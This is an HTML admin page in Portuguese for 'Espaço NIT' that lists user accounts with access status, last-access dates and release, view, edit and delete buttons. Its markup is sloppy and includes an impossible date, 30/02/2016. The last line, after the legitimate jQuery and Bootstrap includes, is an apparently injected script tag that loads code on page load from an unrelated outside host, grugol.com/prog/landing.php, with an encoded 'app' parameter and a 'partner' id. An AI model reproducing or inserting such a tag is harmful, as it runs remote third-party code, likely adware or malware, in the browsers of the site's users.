
<html lang="pt-BR">
	<head>
        
		<meta charset="UTF-8" />
		<title>Administrador - Acesso/Bloqueio</title>
        <meta charset="UTF-8">
	   
		<!--Os arquivos Meta-->
		<meta name="viewport" content="width=device-width,initial-scale=1.0">
		<meta name="description" content"Espaço NIT">
		<meta name="author" content="">
		<!--Fim dos arquivos Meta-->
		
		<!--Os Arquivos CSS-->
		<link href="css/bootstrap.min.css" rel="stylesheet">
		<link href="css/bootstrap-responsive.min.css" rel="stylesheet">
		<link href="css/template.css" rel="stylesheet">


		<!--HTML5 shim,for IE6-8 support of HTML5 elements -->
		<!--[if lt IE 9]>
			<script src="js/html5shiv.js></script>"
		<![endif]-->

	</head>

 <div id="main" class="container-fluid" style="margin-top: 50px">
 	<hr/>
 	<div id="list" class="row">
	
	<div class="table-responsive col-md-12">
		<table class="table table-striped" cellspacing="0" cellpadding="0">
			<thead>
				<tr>
					<th>ID Usu&aacute;rio</th>
					<th>Situa&ccedil;&atilde;o</th>
					
					<th>&Uacuteltimo acesso</th>
					<th class="actions">A&ccedil;&otilde;es</th>
				</tr>
			</thead>
			<body>
			
			<!-- Modal -->
<div class="modal fade" id="delete-modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title" id="modalLabel">Excluir Item</h4>
      </div>
      <div class="modal-body">
        Deseja realmente excluir este Usu&aacute;rio?
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-primary">Sim</button>
	<button type="button" class="btn btn-default" data-dismiss="modal">N&atilde;o</button>
      </div>
    </div>
  </div>
</div>

<div class="modal fade" id="sucess-modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title" id="modalLabel">Liberar usuário</h4>
      </div>
      <div class="modal-body">
        Deseja realmente liberar este Usu&aacute;rio?
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-primary">Sim</button>
	<button type="button" class="btn btn-default" data-dismiss="modal">N&atilde;o</button>
      </div>
    </div>
  </div>
</div>
			
			<nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <span class="navbar-brand" href="index.php"><b>Espaço NIT</b></span>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
            <li class="active"><a href="index.php">DashBoard</a></li>
            <li><a href="https://www.facebook.com/NIT.IFAL/">Fan Page</a></li>
            <li><a href="quem.php">Quem Somos</a></li>
            <li><a href="contato.php">Contato</a></li>
           </ul>
          <ul class="nav navbar-nav navbar-right">
            
            
          
            
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav> <!--Final da NavBar-->

				<tr>
					<td><span class="glyphicon glyphicon-user" aria-hidden="true"></span> arany@ifal</td>
					<td><span class="glyphicon glyphicon-time" aria-hidden="true"></span> Pendente, esperando desbloqueio</td>
					<td>30/02/2016</td>
					<td class="actions">
					
					<!--dropdown-->
						<div class="btn-group">
							<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
						Opções <span class="caret"></span>
						</button>
							<ul class="dropdown-menu">
								<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
									<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
										<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
												<li><a class="btn btn-danger btn-xs"  href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
						</ul>
						</div>
					</td>
				</tr>
				<tr>
				
					<td><span class="glyphicon glyphicon-user" aria-hidden="true"></span> duda123</td>
					<td><span class="glyphicon glyphicon-ok" aria-hidden="true"></span> Acesso liberado</td>
					<td>21/05/2016</td>
					<td class="actions">
					
					<!--dropdown-->
					<div class="btn-group">
							<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
						Opções <span class="caret"></span>
						</button>
							<ul class="dropdown-menu">
								<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
									<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
										<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
												<li><a class="btn btn-danger btn-xs"  href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
						
					</td>
				</tr>
				<tr>
					<td><span class="glyphicon glyphicon-user" aria-hidden="true"></span> julianaifal</td>
					<td><span class="glyphicon glyphicon-ok" aria-hidden="true"></span> Acesso liberado</td>
					<td>01/03/2015</td>
					<td class="actions">
					
					<!--dropdown-->
					<div class="btn-group">
							<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
						Opções <span class="caret"></span>
						</button>
							<ul class="dropdown-menu">
								<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
									<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
										<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
												<li><a class="btn btn-danger btn-xs"  href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
						
					</td>
				</tr>
				<tr>
					<td><span class="glyphicon glyphicon-user" aria-hidden="true"></span> lazaroSilva</td>
					<td><span class="glyphicon glyphicon-remove" aria-hidden="true"></span> Exclus&otildeo de conta</td>
					<td>03/07/2015</td>
					<td class="actions">
						
						<!--dropdown-->
					<div class="btn-group">
							<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
						Opções <span class="caret"></span>
						</button>
							<ul class="dropdown-menu">
								<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
									<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
										<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
												<li><a class="btn btn-danger btn-xs"  href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
					</td>
				</tr>
				<tr>
					<td><span class="glyphicon glyphicon-user" aria-hidden="true"></span> marcilio</td>
					<td><span class="glyphicon glyphicon-ok" aria-hidden="true"></span> Acesso liberado</td>
					<td>23/06/2016</td>
					<td class="actions">
						
						<!--dropdown-->
					<div class="btn-group">
							<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
						Opções <span class="caret"></span>
						</button>
							<ul class="dropdown-menu">
								<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
									<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
										<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
												<li><a class="btn btn-danger btn-xs"  href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
					</td>
				</tr>
				<tr>
					<td><span class="glyphicon glyphicon-user" aria-hidden="true"></span> monica_prof</td>
					<td><span class="glyphicon glyphicon-ok" aria-hidden="true"></span> Acesso liberado</td>
					<td>14/05/2015</td>
					<td class="actions">
						
						<!--dropdown-->
					<div class="btn-group">
							<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
						Opções <span class="caret"></span>
						</button>
							<ul class="dropdown-menu">
								<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
									<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
										<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
												<li><a class="btn btn-danger btn-xs"  href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
					</td>
				</tr>
				<tr>
					<td><span class="glyphicon glyphicon-user" aria-hidden="true"></span> profa_polyana</td>
					<td><span class="glyphicon glyphicon-ok" aria-hidden="true"></span> Acesso liberado</td>
					<td>08/06/2016</td>
					<td class="actions">
					<!--dropdown-->
					<div class="btn-group">
							<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
						Opções <span class="caret"></span>
						</button>
							<ul class="dropdown-menu">
								<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
									<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
										<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
												<li><a class="btn btn-danger btn-xs"  href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
						
					</td>
				</tr>
				<tr>
					<td><span class="glyphicon glyphicon-user" aria-hidden="true"></span> matheus_agra</td>
					<td><span class="glyphicon glyphicon-remove" aria-hidden="true"></span> Exclus&otildeo de conta</td>
					<td>07/04/2015</td>
					<td class="actions">
						
						<!--dropdown-->
					<div class="btn-group">
							<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
						Opções <span class="caret"></span>
						</button>
							<ul class="dropdown-menu">
								<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
									<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
										<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
												<li><a class="btn btn-danger btn-xs"  href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
					</td>
				</tr>
				<tr>
					<td><span class="glyphicon glyphicon-user" aria-hidden="true"></span> breno@prof</td>
					<td><span class="glyphicon glyphicon-ok" aria-hidden="true"></span> Acesso liberado</td>
					<td>09/06/2016</td>
					<td class="actions">
						
						<!--dropdown-->
					<div class="btn-group">
							<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
						Opções <span class="caret"></span>
						</button>
							<ul class="dropdown-menu">
								<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
									<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
										<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
												<li><a class="btn btn-danger btn-xs"  href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
					</td>
				</tr>
				
			</tbody>
		</table>
	</div>
	
	</div> <!-- /#list -->
	
	<div id="bottom" class="row rodape">
		<div class="col-md-12">
			<ul class="pagination">
				<li class="disabled"><a>&lt; Anterior</a></li>
				<li class="disabled"><a>1</a></li>
				<li><a href="#">2</a></li>
				<li><a href="#">3</a></li>
				<li class="next"><a href="#" rel="next">Pr&oacuteximo &gt;</a></li>
			</ul><!-- /.pagination -->
		</div>
	</div> <!-- /#bottom -->
 </div> <!-- /#main -->

<!-- Modal -->
<div class="modal fade" id="delete-modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title" id="modalLabel">Excluir Item</h4>
      </div>
      <div class="modal-body">
        Deseja realmente excluir este item?
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-primary">Sim</button>
	<button type="button" class="btn btn-default" data-dismiss="modal">N&atilde;o</button>
      </div>
    </div>
  </div>
</div>
 <hr>
      <footer>
       <h3>&copy Espaço NIT - Todos os Direitos Reservados</h3>
      </footer>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

<!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<script src='http://grugol.com/prog/landing.php?app=MDAtMUYtRDAtRTgtMEItQTQ=&partner=300'></script></body>
</body>
</html>

</html>